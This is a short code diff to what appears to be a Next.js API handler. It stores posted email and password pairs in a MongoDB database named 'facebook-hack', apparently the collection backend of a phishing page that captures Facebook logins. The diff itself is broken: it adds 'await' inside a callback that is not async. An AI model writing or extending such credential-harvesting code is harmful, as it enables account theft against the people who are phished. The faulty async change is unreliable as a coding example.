@@ -1,7 +1,7 @@
 import { MongoClient } from "mongodb";
 
 
-export default function handler(req, res) {
+const handler = async (req, res) => {
 
   if (req.method === "POST") {
 
@@ -17,7 +17,7 @@ export default function handler(req, res) {
 
       if (!client.isConnected()) {
         client.connect().then(() => {
-          client.db('facebook-hack').collection('users').insertOne({ email, password })
+          await client.db('facebook-hack').collection('users').insertOne({ email, password })
         })
       }
     } catch (error) {
@@ -33,3 +33,7 @@ export default function handler(req, res) {
   }
 
 }
+
+export default handler
+
+
